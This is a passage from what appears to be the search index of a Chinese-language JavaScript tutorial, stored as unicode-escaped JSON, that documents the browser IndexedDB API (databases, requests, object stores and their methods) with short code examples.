\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u53c2\u6570\u4e3a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5b83\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a IDBOpenDBRequest \u5bf9\u8c61\uff0c\u7136\u540e\u5bf9\u6570\u636e\u5e93\u6267\u884c\u5f02\u6b65\u5220\u9664\u3002\u5220\u9664\u64cd\u4f5c\u7684\u7ed3\u679c\u4f1a\u901a\u8fc7\u4e8b\u4ef6\u901a\u77e5\uff0c IDBOpenDBRequest \u5bf9\u8c61\u53ef\u4ee5\u76d1\u542c\u4ee5\u4e0b\u4e8b\u4ef6\u3002 success \uff1a\u5220\u9664\u6210\u529f error \uff1a\u5220\u9664\u62a5\u9519 1 2 3 4 5 6 7 8 9 var DBDeleteRequest = window . indexedDB . deleteDatabase ( 'demo' ); DBDeleteRequest . onerror = function ( event ) { console . log ( 'Error' ); }; DBDeleteRequest . onsuccess = function ( event ) { console . log ( 'success' ); }; \u8c03\u7528 deleteDatabase() \u65b9\u6cd5\u4ee5\u540e\uff0c\u5f53\u524d\u6570\u636e\u5e93\u7684\u5176\u4ed6\u5df2\u7ecf\u6253\u5f00\u7684\u8fde\u63a5\u90fd\u4f1a\u63a5\u6536\u5230 versionchange \u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u5220\u9664\u4e0d\u5b58\u5728\u7684\u6570\u636e\u5e93\u5e76\u4e0d\u4f1a\u62a5\u9519\u3002","title":"indexedDB.deleteDatabase()"},{"location":"bom/indexeddb/#indexeddbcmp","text":"indexedDB.cmp() \u65b9\u6cd5\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u4e3a indexedDB \u7684\u76f8\u540c\u7684\u4e3b\u952e\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6bd4\u8f83\u7684\u7ed3\u679c\uff1a 0 \u8868\u793a\u76f8\u540c\uff0c 1 \u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\uff0c -1 \u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\u3002 1 window . indexedDB . cmp ( 1 , 2 ) // -1 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u7528\u6765\u6bd4\u8f83\u4efb\u610f\u7684 JavaScript \u503c\u3002\u5982\u679c\u53c2\u6570\u662f\u5e03\u5c14\u503c\u6216\u5bf9\u8c61\uff0c\u5b83\u4f1a\u62a5\u9519\u3002 1 2 window . indexedDB . cmp ( 1 , true ) // \u62a5\u9519 window . indexedDB . cmp ({}, {}) // \u62a5\u9519","title":"indexedDB.cmp()"},{"location":"bom/indexeddb/#idbrequest","text":"IDBRequest \u5bf9\u8c61\u8868\u793a\u6253\u5f00\u7684\u6570\u636e\u5e93\u8fde\u63a5\uff0c indexedDB.open() \u65b9\u6cd5\u548c indexedDB.deleteDatabase() \u65b9\u6cd5\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\u3002\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u7684\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u8981\u901a\u8fc7 readyState \u5c5e\u6027\u5224\u65ad\u662f\u5426\u5b8c\u6210\uff0c\u5982\u679c\u4e3a pending \u5c31\u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u5982\u679c\u4e3a done \u5c31\u8868\u793a\u64cd\u4f5c\u5b8c\u6210\uff0c\u53ef\u80fd\u6210\u529f\u4e5f\u53ef\u80fd\u5931\u8d25\u3002 \u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\uff0c\u89e6\u53d1 success \u4e8b\u4ef6\u6216 error \u4e8b\u4ef6\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7 result \u5c5e\u6027\u548c error \u5c5e\u6027\u62ff\u5230\u64cd\u4f5c\u7ed3\u679c\u3002\u5982\u679c\u5728 pending \u9636\u6bb5\uff0c\u5c31\u53bb\u8bfb\u53d6\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u662f\u4f1a\u62a5\u9519\u7684\u3002 IDBRequest \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBRequest.readyState \uff1a\u7b49\u4e8e pending \u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u7b49\u4e8e done \u8868\u793a\u64cd\u4f5c\u6b63\u5728\u5b8c\u6210\u3002 IDBRequest.result \uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u7ed3\u679c\u3002\u5982\u679c\u8bf7\u6c42\u5931\u8d25\u3001\u7ed3\u679c\u4e0d\u53ef\u7528\uff0c\u8bfb\u53d6\u8be5\u5c5e\u6027\u4f1a\u62a5\u9519\u3002 IDBRequest.error \uff1a\u8bf7\u6c42\u5931\u8d25\u65f6\uff0c\u8fd4\u56de\u9519\u8bef\u5bf9\u8c61\u3002 IDBRequest.source \uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u6765\u6e90\uff08\u6bd4\u5982\u7d22\u5f15\u5bf9\u8c61\u6216 ObjectStore\uff09\u3002 IDBRequest.transaction \uff1a\u8fd4\u56de\u5f53\u524d\u8bf7\u6c42\u6b63\u5728\u8fdb\u884c\u7684\u4e8b\u52a1\uff0c\u5982\u679c\u4e0d\u5305\u542b\u4e8b\u52a1\uff0c\u8fd4\u56de null \u3002 IDBRequest.onsuccess \uff1a\u6307\u5b9a success \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBRequest.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBOpenDBRequest \u5bf9\u8c61\u7ee7\u627f\u4e86 IDBRequest \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e24\u4e2a\u989d\u5916\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\u3002 IDBOpenDBRequest.onblocked \uff1a\u6307\u5b9a blocked \u4e8b\u4ef6\uff08 upgradeneeded \u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u6570\u636e\u5e93\u4ecd\u7136\u5728\u4f7f\u7528\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBOpenDBRequest.onupgradeneeded \uff1a upgradeneeded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002","title":"IDBRequest \u5bf9\u8c61"},{"location":"bom/indexeddb/#idbdatabase","text":"\u6253\u5f00\u6570\u636e\u6210\u529f\u4ee5\u540e\uff0c\u53ef\u4ee5\u4ece IDBOpenDBRequest \u5bf9\u8c61\u7684 result \u5c5e\u6027\u4e0a\u9762\uff0c\u62ff\u5230\u4e00\u4e2a IDBDatabase \u5bf9\u8c61\uff0c\u5b83\u8868\u793a\u8fde\u63a5\u7684\u6570\u636e\u5e93\u3002\u540e\u9762\u5bf9\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u90fd\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onerror = function ( event ) { console . log ( 'Error' ); }; DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; // ... };","title":"IDBDatabase \u5bf9\u8c61"},{"location":"bom/indexeddb/#_12","text":"IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBDatabase.name \uff1a\u5b57\u7b26\u4e32\uff0c\u6570\u636e\u5e93\u540d\u79f0\u3002 IDBDatabase.version \uff1a\u6574\u6570\uff0c\u6570\u636e\u5e93\u7248\u672c\u3002\u6570\u636e\u5e93\u7b2c\u4e00\u6b21\u521b\u5efa\u65f6\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 IDBDatabase.objectStoreNames \uff1aDOMStringList \u5bf9\u8c61\uff08\u5b57\u7b26\u4e32\u7684\u96c6\u5408\uff09\uff0c\u5305\u542b\u5f53\u524d\u6570\u636e\u7684\u6240\u6709 object store \u7684\u540d\u5b57\u3002 IDBDatabase.onabort \uff1a\u6307\u5b9a abort \u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u6b62\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onclose \uff1a\u6307\u5b9a close \u4e8b\u4ef6\uff08\u6570\u636e\u5e93\u610f\u5916\u5173\u95ed\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\uff08\u8bbf\u95ee\u6570\u636e\u5e93\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onversionchange \uff1a\u6570\u636e\u5e93\u7248\u672c\u53d8\u5316\u65f6\u89e6\u53d1\uff08\u53d1\u751f upgradeneeded \u4e8b\u4ef6\uff0c\u6216\u8c03\u7528 indexedDB.deleteDatabase() \uff09\u3002 \u4e0b\u9762\u662f objectStoreNames \u5c5e\u6027\u7684\u4f8b\u5b50\u3002\u8be5\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DOMStringList \u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u6570\u636e\u5e93\u6240\u6709\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\uff08\u5373\u8868\u540d\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 DOMStringList \u5bf9\u8c61\u7684 contains \u65b9\u6cd5\uff0c\u68c0\u67e5\u6570\u636e\u5e93\u662f\u5426\u5305\u542b\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u3002 1 2 3 if ( ! db . objectStoreNames . contains ( 'firstOS' )) { db . createObjectStore ( 'firstOS' ); } \u4e0a\u9762\u4ee3\u7801\u5148\u5224\u65ad\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5c31\u521b\u5efa\u8be5\u5bf9\u8c61\u4ed3\u5e93\u3002","title":"\u5c5e\u6027"},{"location":"bom/indexeddb/#_13","text":"IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 IDBDatabase.close() \uff1a\u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5b9e\u9645\u4f1a\u7b49\u6240\u6709\u4e8b\u52a1\u5b8c\u6210\u540e\u518d\u5173\u95ed\u3002 IDBDatabase.createObjectStore() \uff1a\u521b\u5efa\u5b58\u653e\u6570\u636e\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7c7b\u4f3c\u4e8e\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u683c\uff0c\u8fd4\u56de\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 versionchange \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002 IDBDatabase.deleteObjectStore() \uff1a\u5220\u9664\u6307\u5b9a\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 versionchange \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002 IDBDatabase.transaction() \uff1a\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u4e8b\u52a1\u5bf9\u8c61\u3002 \u4e0b\u9762\u662f createObjectStore() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var request = window . indexedDB . open ( 'demo' , 2 ); request . onupgradeneeded = function ( event ) { var db = event . target . result ; db . onerror = function ( event ) { console . log ( 'error' ); }; var objectStore = db . createObjectStore ( 'items' ); // ... }; \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a items \u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u5982\u679c\u8be5\u5bf9\u8c61\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002\u4e3a\u4e86\u907f\u514d\u51fa\u9519\uff0c\u9700\u8981\u7528\u5230\u4e0b\u6587\u7684 objectStoreNames \u5c5e\u6027\uff0c\u68c0\u67e5\u5df2\u6709\u54ea\u4e9b\u5bf9\u8c61\u4ed3\u5e93\u3002 createObjectStore() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u53c2\u6570\uff0c\u7528\u6765\u8bbe\u7f6e\u5bf9\u8c61\u4ed3\u5e93\u7684\u5c5e\u6027\u3002 1 2 db . createObjectStore ( 'test' , { keyPath : 'email' }); db . createObjectStore ( 'test2' , { autoIncrement : true }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c keyPath \u5c5e\u6027\u8868\u793a\u4e3b\u952e\uff08\u7531\u4e8e\u4e3b\u952e\u7684\u503c\u4e0d\u80fd\u91cd\u590d\uff0c\u6240\u4ee5\u4e0a\u4f8b\u5b58\u5165\u4e4b\u524d\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6570\u636e\u7684 email \u5c5e\u6027\u503c\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a null \uff1b autoIncrement \u5c5e\u6027\u8868\u793a\uff0c\u662f\u5426\u4f7f\u7528\u81ea\u52a8\u9012\u589e\u7684\u6574\u6570\u4f5c\u4e3a\u4e3b\u952e\uff08\u7b2c\u4e00\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a1\uff0c\u7b2c\u4e8c\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a2\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u4e00\u822c\u6765\u8bf4\uff0c keyPath \u548c autoIncrement \u5c5e\u6027\u53ea\u8981\u4f7f\u7528\u4e00\u4e2a\u5c31\u591f\u4e86\uff0c\u5982\u679c\u4e24\u4e2a\u540c\u65f6\u4f7f\u7528\uff0c\u8868\u793a\u4e3b\u952e\u4e3a\u9012\u589e\u7684\u6574\u6570\uff0c\u4e14\u5bf9\u8c61\u4e0d\u5f97\u7f3a\u5c11 keyPath \u6307\u5b9a\u7684\u5c5e\u6027\u3002 \u4e0b\u9762\u662f deleteObjectStore() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var dbName = 'sampleDB' ; var dbVersion = 2 ; var request = indexedDB . open ( dbName , dbVersion ); request . onupgradeneeded = function ( e ) { var db = request . result ; if ( e . oldVersion < 1 ) { db . createObjectStore ( 'store1' ); } if ( e . oldVersion < 2 ) { db . deleteObjectStore ( 'store1' ); db . createObjectStore ( 'store2' ); } // ... }; \u4e0b\u9762\u662f transaction() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u8be5\u65b9\u6cd5\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002\u5411\u6570\u636e\u5e93\u6dfb\u52a0\u6570\u636e\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u521b\u5efa\u6570\u636e\u5e93\u4e8b\u52a1\u3002 1 var t = db . transaction ([ 'items' ], 'readwrite' ); transaction() \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u91cc\u9762\u662f\u6240\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u901a\u5e38\u662f\u53ea\u6709\u4e00\u4e2a\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u8868\u793a\u64cd\u4f5c\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u3002\u76ee\u524d\uff0c\u64cd\u4f5c\u7c7b\u578b\u53ea\u6709\u4e24\u79cd\uff1a readonly \uff08\u53ea\u8bfb\uff09\u548c readwrite \uff08\u8bfb\u5199\uff09\u3002\u6dfb\u52a0\u6570\u636e\u4f7f\u7528 readwrite \uff0c\u8bfb\u53d6\u6570\u636e\u4f7f\u7528 readonly \u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u7701\u7565\u65f6\u9ed8\u8ba4\u4e3a readonly \u6a21\u5f0f\u3002","title":"\u65b9\u6cd5"},{"location":"bom/indexeddb/#idbobjectstore","text":"IDBObjectStore \u5bf9\u8c61\u5bf9\u5e94\u4e00\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u3002 IDBDatabase.createObjectStore() \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002 IDBDatabase \u5bf9\u8c61\u7684 transaction() \u8fd4\u56de\u4e00\u4e2a\u4e8b\u52a1\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684 objectStore() \u65b9\u6cd5\u8fd4\u56de IDBObjectStore \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u94fe\u5f0f\u5199\u6cd5\u3002 1 2 3 4 db . transaction ([ 'test' ], 'readonly' ) . objectStore ( 'test' ) . get ( X ) . onsuccess = function ( e ) {}","title":"IDBObjectStore \u5bf9\u8c61"},{"location":"bom/indexeddb/#_14","text":"IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBObjectStore.indexNames \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08DOMStringList\uff09\uff0c\u5305\u542b\u4e86\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u7d22\u5f15\u3002 IDBObjectStore.keyPath \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u4e3b\u952e\u3002 IDBObjectStore.name \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\u3002 IDBObjectStore.transaction \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u6240\u5c5e\u7684\u4e8b\u52a1\u5bf9\u8c61\u3002 IDBObjectStore.autoIncrement \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e3b\u952e\u662f\u5426\u4f1a\u81ea\u52a8\u9012\u589e\u3002","title":"\u5c5e\u6027"},{"location":"bom/indexeddb/#_15","text":"IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 \uff081\uff09IDBObjectStore.add() IDBObjectStore.add() \u7528\u4e8e\u5411\u5bf9\u8c61\u4ed3\u5e93\u6dfb\u52a0\u6570\u636e\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u7528\u4e8e\u6dfb\u52a0\u6570\u636e\uff0c\u5982\u679c\u4e3b\u952e\u76f8\u540c\u4f1a\u62a5\u9519\uff0c\u56e0\u6b64\u66f4\u65b0\u6570\u636e\u5fc5\u987b\u4f7f\u7528 put() \u65b9\u6cd5\u3002 1 objectStore . add ( value , key ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u952e\u503c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u5982\u679c\u7701\u7565\u9ed8\u8ba4\u4e3a null \u3002 \u521b\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7136\u540e\u4f7f\u7528 add() \u65b9\u6cd5\u5f80\u91cc\u9762\u6dfb\u52a0\u6570\u636e\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; var transaction = db . transaction ([ 'items' ], 'readwrite' ); transaction . oncomplete = function ( event ) { console . log ( 'transaction success' ); }; transaction . onerror = function ( event ) { console . log ( 'transaction error: ' + transaction . error ); }; var objectStore = transaction . objectStore ( 'items' ); var objectStoreRequest = objectStore . add ({ foo : 1 }); objectStoreRequest . onsuccess = function ( event ) { console . log ( 'add data success' ); }; }; \uff082\uff09IDBObjectStore.put() IDBObjectStore.put() \u65b9\u6cd5\u7528\u4e8e\u66f4\u65b0\u67d0\u4e2a\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u952e\u503c\u4e0d\u5b58\u5728\uff0c\u5219\u63d2\u5165\u4e00\u6761\u65b0\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . put ( item , key ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u65b0\u6570\u636e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u4e14\u53ea\u5728\u81ea\u52a8\u9012\u589e\u65f6\u624d\u6709\u5fc5\u8981\u63d0\u4f9b\uff0c\u56e0\u4e3a\u90a3\u65f6\u4e3b\u952e\u4e0d\u5305\u542b\u5728\u6570\u636e\u503c\u91cc\u9762\u3002 \uff083\uff09IDBObjectStore.clear() IDBObjectStore.clear() \u5220\u9664\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . clear () \u8be5\u65b9\u6cd5\u4e0d\u9700\u8981\u53c2\u6570\u3002 \uff084\uff09IDBObjectStore.delete() IDBObjectStore.delete() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . delete ( Key ) \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u4e3b\u952e\u7684\u503c\u3002 \uff085\uff09IDBObjectStore.count() IDBObjectStore.count() \u65b9\u6cd5\u7528\u4e8e\u8ba1\u7b97\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 IDBObjectStore . count ( key ) \u4e0d\u5e26\u53c2\u6570\u65f6\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u6570\u91cf\u3002\u5982\u679c\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u8bb0\u5f55\u6570\u91cf\u3002 \uff086\uff09IDBObjectStore.getKey() IDBObjectStore.getKey() \u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . getKey ( key ) \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u4e3b\u952e\u503c\u6216 IDBKeyRange \u5bf9\u8c61\u3002 \uff087\uff09IDBObjectStore.get() IDBObjectStore.get() \u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . get ( key ) \uff088\uff09IDBObjectStore.getAll() DBObjectStore.getAll() \u7528\u4e8e\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 // \u83b7\u53d6\u6240\u6709\u8bb0\u5f55 objectStore . getAll () // \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u6216 IDBKeyRange \u7684\u8bb0\u5f55 objectStore . getAll ( query ) // \u6307\u5b9a\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf objectStore . getAll ( query , count ) \uff089\uff09IDBObjectStore.getAllKeys() IDBObjectStore.getAllKeys() \u7528\u4e8e\u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 // \u83b7\u53d6\u6240\u6709\u8bb0\u5f55\u7684\u4e3b\u952e objectStore . getAllKeys () // \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e objectStore . getAllKeys ( query ) // \u6307\u5b9a\u83b7\u53d6\u4e3b\u952e\u7684\u6570\u91cf objectStore . getAllKeys ( query , count ) \uff0810\uff09IDBObjectStore.index() IDBObjectStore.index() \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u7d22\u5f15\u5bf9\u8c61 IDBIndex\u3002 1 objectStore . index ( name ) \u6709\u4e86\u7d22\u5f15\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u9488\u5bf9\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u3002 1 2 3 4 5 var t = db . transaction ([ 'people' ], 'readonly' ); var store = t . objectStore ( 'people' ); var index = store . index ( 'name' ); var request = index . get ( 'foo' ); \u4e0a\u9762\u4ee3\u7801\u6253\u5f00\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u5148\u7528 index() \u65b9\u6cd5\u6307\u5b9a\u83b7\u53d6 name \u5c5e\u6027\u7684\u7d22\u5f15\uff0c\u7136\u540e\u7528 get() \u65b9\u6cd5\u8bfb\u53d6\u67d0\u4e2a name \u5c5e\u6027( foo )\u5bf9\u5e94\u7684\u6570\u636e\u3002\u5982\u679c name \u5c5e\u6027\u4e0d\u662f\u5bf9\u5e94\u552f\u4e00\u503c\uff0c\u8fd9\u65f6 get() \u65b9\u6cd5\u6709\u53ef\u80fd\u53d6\u56de\u591a\u4e2a\u6570\u636e\u5bf9\u8c61\u3002\u53e6\u5916\uff0c get() \u662f\u5f02\u6b65\u65b9\u6cd5\uff0c\u8bfb\u53d6\u6210\u529f\u4ee5\u540e\uff0c\u53ea\u80fd\u5728 success \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u5904\u7406\u6570\u636e\u3002 \uff0811\uff09IDBObjectStore.createIndex() IDBObjectStore.createIndex() \u65b9\u6cd5\u7528\u4e8e\u65b0\u5efa\u5f53\u524d\u6570\u636e\u5e93\u7684\u4e00\u4e2a\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 VersionChange \u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002 1 objectStore . createIndex ( indexName , keyPath , objectParameters ) \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 indexName\uff1a\u7d22\u5f15\u540d keyPath\uff1a\u4e3b\u952e objectParameters\uff1a\u914d\u7f6e\u5bf9\u8c61\uff08\u53ef\u9009\uff09 \u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5c5e\u6027\u3002 unique\uff1a\u5982\u679c\u8bbe\u4e3a true \uff0c\u5c06\u4e0d\u5141\u8bb8\u91cd\u590d\u7684\u503c multiEntry\uff1a\u5982\u679c\u8bbe\u4e3a true 